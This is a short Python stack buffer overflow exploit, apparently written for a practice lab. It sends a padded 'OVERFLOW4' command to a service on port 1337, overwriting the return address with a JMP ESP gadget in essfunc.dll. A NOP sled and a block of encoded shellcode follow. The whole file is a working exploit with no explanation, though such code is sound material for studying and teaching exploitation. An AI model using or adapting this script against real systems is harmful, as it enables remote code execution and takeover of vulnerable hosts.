import socket
import sys
import time


print("[+] Nani???? Got shellP!!\n")

buff = "A" * 2026

eip = "\xd3\x11\x50\x62" # 0x625011D3 JMP ESP essfunc.dll

nops = "\x90" * 16

shellcode =  b""
shellcode += b"\xb8\xd6\x83\xdc\xac\xda\xc8\xd9\x74\x24\xf4"
shellcode += b"\x5b\x2b\xc9\xb1\x52\x83\xeb\xfc\x31\x43\x0e"
shellcode += b"\x03\x95\x8d\x3e\x59\xe5\x7a\x3c\xa2\x15\x7b"
shellcode += b"\x21\x2a\xf0\x4a\x61\x48\x71\xfc\x51\x1a\xd7"
shellcode += b"\xf1\x1a\x4e\xc3\x82\x6f\x47\xe4\x23\xc5\xb1"
shellcode += b"\xcb\xb4\x76\x81\x4a\x37\x85\xd6\xac\x06\x46"
shellcode += b"\x2b\xad\x4f\xbb\xc6\xff\x18\xb7\x75\xef\x2d"
shellcode += b"\x8d\x45\x84\x7e\x03\xce\x79\x36\x22\xff\x2c"
shellcode += b"\x4c\x7d\xdf\xcf\x81\xf5\x56\xd7\xc6\x30\x20"
shellcode += b"\x6c\x3c\xce\xb3\xa4\x0c\x2f\x1f\x89\xa0\xc2"
shellcode += b"\x61\xce\x07\x3d\x14\x26\x74\xc0\x2f\xfd\x06"
shellcode += b"\x1e\xa5\xe5\xa1\xd5\x1d\xc1\x50\x39\xfb\x82"
shellcode += b"\x5f\xf6\x8f\xcc\x43\x09\x43\x67\x7f\x82\x62"
shellcode += b"\xa7\x09\xd0\x40\x63\x51\x82\xe9\x32\x3f\x65"
shellcode += b"\x15\x24\xe0\xda\xb3\x2f\x0d\x0e\xce\x72\x5a"
shellcode += b"\xe3\xe3\x8c\x9a\x6b\x73\xff\xa8\x34\x2f\x97"
shellcode += b"\x80\xbd\xe9\x60\xe6\x97\x4e\xfe\x19\x18\xaf"
shellcode += b"\xd7\xdd\x4c\xff\x4f\xf7\xec\x94\x8f\xf8\x38"
shellcode += b"\x3a\xdf\x56\x93\xfb\x8f\x16\x43\x94\xc5\x98"
shellcode += b"\xbc\x84\xe6\x72\xd5\x2f\x1d\x15\xd0\xa6\x1c"
shellcode += b"\xc7\x8c\xba\x1e\x06\xf6\x32\xf8\x62\x18\x13"
shellcode += b"\x53\x1b\x81\x3e\x2f\xba\x4e\x95\x4a\xfc\xc5"
shellcode += b"\x1a\xab\xb3\x2d\x56\xbf\x24\xde\x2d\x9d\xe3"
shellcode += b"\xe1\x9b\x89\x68\x73\x40\x49\xe6\x68\xdf\x1e"
shellcode += b"\xaf\x5f\x16\xca\x5d\xf9\x80\xe8\x9f\x9f\xeb"
shellcode += b"\xa8\x7b\x5c\xf5\x31\x09\xd8\xd1\x21\xd7\xe1"
shellcode += b"\x5d\x15\x87\xb7\x0b\xc3\x61\x6e\xfa\xbd\x3b"
shellcode += b"\xdd\x54\x29\xbd\x2d\x67\x2f\xc2\x7b\x11\xcf"
shellcode += b"\x73\xd2\x64\xf0\xbc\xb2\x60\x89\xa0\x22\x8e"
shellcode += b"\x40\x61\x42\x6d\x40\x9c\xeb\x28\x01\x1d\x76"
shellcode += b"\xcb\xfc\x62\x8f\x48\xf4\x1a\x74\x50\x7d\x1e"
shellcode += b"\x30\xd6\x6e\x52\x29\xb3\x90\xc1\x4a\x96"

#Final payload
payload = buff + eip + nops + shellcode

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect to the Application
s.connect(('10.10.154.225', 1337))
s.recv(1024)	#Recv the banner


#Finally the vulnerable command
s.send('OVERFLOW4 ' + payload + '\r\n')
s.send('EXIT\r\n')
s.close()
	
print("[+] Execution Finished")
